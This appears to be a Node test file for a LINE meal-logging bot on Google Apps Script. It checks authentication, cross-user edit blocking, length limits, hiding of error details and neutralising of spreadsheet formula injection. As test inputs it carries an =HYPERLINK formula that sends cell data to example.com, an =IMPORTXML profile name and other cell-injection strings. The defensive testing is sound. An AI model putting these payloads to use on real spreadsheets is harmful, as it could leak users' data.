// セキュリティの決まり（q-oqrn の docs/security.md）を、食事記録で確かめる
import test from "node:test";
import assert from "node:assert";
import { makeMealGas, day, response , U1, U2, UADMIN, UPEND, UNEW } from "./meal-helpers.mjs";

const FORMULA = '=HYPERLINK("https://example.com/?q="&A1,"x")';

// ---- G3・G4 だれが呼べるか ----

test("画面から：本人確認の印がない・LINE が断る呼び出しは断る", () => {
  const gas = makeMealGas();
  for (const action of ["getLiffAppState", "submitMealBatch", "updateMealLog", "deleteMealLog", "updateProfile", "submitMealDetail", "saveNutritionMasterOnly", "listMealLogs"]) {
    const none = gas.post({ action, userId: U1 });
    assert.equal(none.ok, false, `${action}（印なし）`);
    assert.equal(none.error, "auth");
    const bad = gas.post({ action, userId: U1, idToken: "forged" });
    assert.equal(bad.ok, false, `${action}（にせの印）`);
    assert.doesNotMatch(bad.error, /IdToken|status|invalid/i, "LINE の返事の中身は出さない");
  }
  assert.equal(gas.logsOf(U1).length, 15, "記録は変わらない");
});

test("画面から：送られた userId は使わず、ID トークンの本人で決める", () => {
  const gas = makeMealGas();
  const res = gas.post({ action: "getLiffAppState", idToken: "t-U2", userId: U1 });
  assert.equal(res.ok, true);
  assert.equal(res.identity.userId, "", "ボットから見た LINE の ID は画面に返さない");
  assert.ok(res.dashboard.logEntries.today.every((l) => l.userId === U2));

  const add = gas.post({ action: "submitMealBatch", idToken: "t-U2", userId: U1, items: [{ meal: "夜", menu: "そば", kcal: 300, mealDate: day(0) }], sendLineSummary: false });
  assert.equal(add.ok, true);
  assert.equal(gas.logsOf(U2).some((l) => l.menu === "そば"), true);
  assert.equal(gas.logsOf(U1).some((l) => l.menu === "そば"), false);
});

test("画面から：ほかの人の記録は、logId や行の番号を変えて送っても、直せない・消せない", () => {
  const gas = makeMealGas();
  const before = JSON.stringify(gas.rows("meal_logs"));
  const target = gas.log("b0");
  const rowOfTarget = gas.rows("meal_logs").findIndex((r) => r.includes("b0")) + 1;
  for (const ref of [{ logId: "b0" }, { row: rowOfTarget }, { logId: String(rowOfTarget) }]) {
    const upd = gas.post({ action: "updateMealLog", idToken: "t-U2", ...ref, menu: "のっとり", kcal: 1, meal: "昼", saveToMaster: false, sendLineSummary: false });
    assert.equal(upd.ok, false, JSON.stringify(ref));
    const del = gas.post({ action: "deleteMealLog", idToken: "t-U2", ...ref });
    assert.equal(del.ok, false, JSON.stringify(ref));
  }
  assert.equal(JSON.stringify(gas.rows("meal_logs")), before);
  assert.equal(gas.log("b0").menu, target.menu);
});

test("画面から：自分の記録は直せる・消せる", () => {
  const gas = makeMealGas();
  const upd = gas.post({ action: "updateMealLog", idToken: "t-U1", logId: "p1", menu: "チョコ", kcal: 200, meal: "その他", saveToMaster: false, sendLineSummary: false });
  assert.equal(upd.ok, true, upd.error);
  assert.equal(gas.log("p1").kcal, 200);
  const del = gas.post({ action: "deleteMealLog", idToken: "t-U1", logId: "p1" });
  assert.equal(del.ok, true, del.error);
  assert.equal(gas.log("p1"), null);
});

test("LINE から：ほかの人の記録のボタン（postback）を送っても変わらない", () => {
  const gas = makeMealGas();
  const before = JSON.stringify(gas.log("u2-1"));
  gas.line({ type: "postback", postback: { data: "m=meal&action=estimateKcal&logId=u2-1&kcal=999&note=x" } });
  gas.line({ type: "postback", postback: { data: "m=meal&action=resolvePendingKcal&logId=u2-1&kcal=999" } });
  gas.line({ type: "postback", postback: { data: "m=meal&action=savePendingMaster&logId=u2-1" } });
  gas.line({ type: "postback", postback: { data: "m=meal&action=logCandidate&logId=u2-1&masterKey=m1&meal=朝" } });
  assert.equal(JSON.stringify(gas.log("u2-1")), before);
});

test("許可待ちの人は、画面から記録できない", () => {
  const gas = makeMealGas();
  const res = gas.post({ action: "submitMealBatch", idToken: "t-PENDING", items: [{ meal: "朝", menu: "パン", kcal: 200 }] });
  assert.equal(res.ok, false);
  assert.equal(res.error, "notyou");
  assert.equal(gas.logsOf(UPEND).length, 0);
});

test("LINE から：Webhook の合言葉がちがう・ないときは何もしない", () => {
  const gas = makeMealGas();
  gas.line({ type: "message", message: { type: "text", text: "昼 なぞ定食" } }, "wrong");
  gas.line({ type: "message", message: { type: "text", text: "昼 なぞ定食" } }, "");
  assert.equal(gas.logsOf(U1).length, 15);
  assert.equal(gas.replies().length, 0);
});

// ---- G1 外の文字を式のままシートに入れない ----

test("LINE から：式の形の名前を送っても、シートに式のまま入らない。読みなおしても ' は付かない", () => {
  const gas = makeMealGas();
  gas.line({ type: "message", message: { type: "text", text: `昼 ${FORMULA}` } });
  gas.line({ type: "message", message: { type: "text", text: "+SUM(1,2)" } });
  gas.line({ type: "message", message: { type: "text", text: "@cmd" } });
  gas.line({ type: "message", message: { type: "text", text: "-1+1" } });
  assert.deepEqual(gas.formulaCells(), []);
  const logs = gas.logsOf(U1).map((l) => l.menu);
  assert.ok(logs.includes(FORMULA), "名前は変わらずに残る（シートの見た目でも ' は出ない）");

  const res = gas.post({ action: "getLiffAppState", idToken: "t-U1" });
  const menus = res.dashboard.logEntries.today.map((l) => l.menu);
  assert.ok(menus.includes(FORMULA));
  assert.ok(menus.every((m) => !m.startsWith("'")), "画面に ' が出ない");
});

test("画面から：名前・種類・量・メモ・MYメニュー・まとめて記録・名前のどこから入れても、式のまま入らない", () => {
  // LINE の名前が式の形の人（しょくじの人のシートにまだいない人は、LINE のプロフィールの名前を使う）
  const gas = makeMealGas({
    fetch: (url) => (/\/v2\/bot\/profile\//.test(url) ? response(200, { displayName: "=IMPORTXML(\"https://example.com\",\"//a\")" }) : undefined),
  });
  gas.sheet("meal_users").rows.splice(gas.rows("meal_users").findIndex((r) => r[0] === U2), 1);
  const evil = { menu: FORMULA, flavor: "+1+cmd", unit: "-x", note: "@me", meal: "夜", kcal: 500, protein: 10, mealDate: day(0), sendLineSummary: false };
  assert.equal(gas.post({ action: "submitMealDetail", idToken: "t-U1", ...evil }).ok, true);
  assert.equal(gas.post({ action: "submitMealDetail", idToken: "t-U1", ...evil, saveToMaster: false }).ok, true);
  assert.equal(gas.post({ action: "saveNutritionMasterOnly", idToken: "t-U1", ...evil, masterKey: "=evil" }).ok, true);
  assert.equal(gas.post({ action: "submitMealBatch", idToken: "t-U1", items: [evil, { ...evil, kcal: null }], dedupe: false, sendLineSummary: false }).ok, true);
  const logId = gas.logsOf(U1).find((l) => l.menu === FORMULA).logId;
  assert.equal(gas.post({ action: "updateMealLog", idToken: "t-U1", logId, ...evil, note: "=1+1", sendLineSummary: false }).ok, true);
  assert.equal(gas.post({ action: "updateProfile", idToken: "t-U2", calorieTarget: 1900, favorites: ["=x", "m1"] }).ok, true);
  assert.deepEqual(gas.formulaCells(), []);
  // 画面から送られた masterKey は、もうあるものだけ使う
  const keys = gas.rows("nutrition_master").slice(1).map((r) => r[0]);
  assert.ok(!keys.includes("=evil"));
});

test("LINE から：だいたいのカロリーのボタンのメモも、式のまま入らない", () => {
  const gas = makeMealGas();
  gas.line({ type: "postback", postback: { data: `m=meal&action=estimateKcal&logId=p1&kcal=240&note=${encodeURIComponent("=1+2")}` } });
  assert.deepEqual(gas.formulaCells(), []);
  assert.equal(gas.log("p1").kcal, 240);
});

// ---- G6 長さと数 ----

test("長すぎる名前・メモは切る。まとめて記録は 30 件まで", () => {
  const gas = makeMealGas();
  const long = "あ".repeat(500);
  gas.post({ action: "submitMealDetail", idToken: "t-U1", menu: long, note: long, flavor: long, unit: long, meal: "夜", kcal: 100, sendLineSummary: false });
  const saved = gas.logsOf(U1).find((l) => String(l.menu).startsWith("あ"));
  assert.equal(saved.menu.length, 60);
  assert.equal(saved.note.length, 200);
  assert.ok(saved.flavor.length <= 40 && saved.unit.length <= 40);

  gas.line({ type: "message", message: { type: "text", text: `昼 ${"い".repeat(3000)}` } });
  assert.ok(gas.logsOf(U1).every((l) => String(l.menu).length <= 60));

  const items = Array.from({ length: 100 }, (_, i) => ({ meal: "朝", menu: `品${i}`, kcal: 10, mealDate: day(0) }));
  const res = gas.post({ action: "submitMealBatch", idToken: "t-U2", items, sendLineSummary: false });
  assert.equal(res.added.length, 30);
});

// ---- G2 エラーの中身を出さない ----

test("思いがけないエラーの中身は、画面にも LINE にも出さない（実行ログにだけ）", () => {
  const gas = makeMealGas();
  // qcheck-ok: W2 テストの偽物の GAS で、わざとエラーを起こすだけ
  gas.eval("mealGetDashboardData_ = function () { throw new Error('Service Spreadsheets failed: secret-detail'); }");
  const res = gas.post({ action: "getLiffAppState", idToken: "t-U1" });
  assert.equal(res.ok, false);
  assert.doesNotMatch(res.error, /secret-detail|Spreadsheets/);
  assert.ok(gas.logs.some((l) => l.includes("secret-detail")), "実行ログには残す");

  gas.line({ type: "message", message: { type: "text", text: "トースト" } });
  const text = JSON.stringify(gas.replies());
  assert.doesNotMatch(text, /secret-detail/);
  assert.match(text, /うまくいきませんでした/);
});

test("連続記録ランキングに、ほかの人の LINE のユーザー ID を入れない", () => {
  const gas = makeMealGas();
  const res = gas.post({ action: "getLiffAppState", idToken: "t-U2" });
  const ranking = res.dashboard.streakRanking;
  assert.ok(ranking.length >= 2);
  assert.ok(ranking.every((r) => !("userId" in r)));
  assert.equal(ranking.find((r) => r.me).displayName, "はな");
  assert.doesNotMatch(JSON.stringify(res), /U1|UADMIN|UPEND/);
});

// ---- G7 同時に書く ----

test("読んだあとにほかの人が行を消しても、直すのはその記録の行だけ", () => {
  const gas = makeMealGas();
  const before = gas.run("JSON.stringify(mealGetMealLogById_('u2-1'))");
  const stale = JSON.parse(before);
  // ほかの人が上の行を消した（行の番号が1つずれる）
  gas.sheet("meal_logs").deleteRow(2);
  stale.mealDate = new Date(stale.mealDate);
  stale.menu = "きつねうどん";
  gas.ctx.__stale = stale;
  gas.run("mealUpdateMealLog_(globalThis.__stale)");
  assert.equal(gas.log("u2-1").menu, "きつねうどん");
  assert.equal(gas.logsOf(U1).some((l) => l.menu === "きつねうどん"), false, "ほかの人の行を書きかえない");
});
